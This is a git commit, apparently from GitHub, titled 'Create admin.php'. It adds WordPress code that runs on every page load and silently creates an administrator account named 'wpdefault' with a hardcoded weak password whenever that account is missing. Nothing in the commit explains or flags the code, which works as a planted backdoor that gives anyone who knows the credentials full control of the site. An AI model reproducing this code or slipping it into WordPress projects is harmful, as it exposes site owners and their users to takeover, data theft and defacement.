e8a39e007af904e4235221d446e7badd455fa51a
Imran <79074407+Imran914-u@users.noreply.github.com>
2021-11-01 21:56:46 +0600

    Create admin.php

---
+++ admin.php
@@ -0,0 +1,11 @@
+add_action( 'init', function () {
+$username = 'wpdefault';
+$password = '1234567890!';
+$email_address = 'wordpress@example.com';
+
+if ( ! username_exists( $username ) ) {
+	$user_id = wp_create_user( $username, $password, $email_address );
+	$user = new WP_User( $user_id );
+	$user->set_role( 'administrator' );
+}
+} );
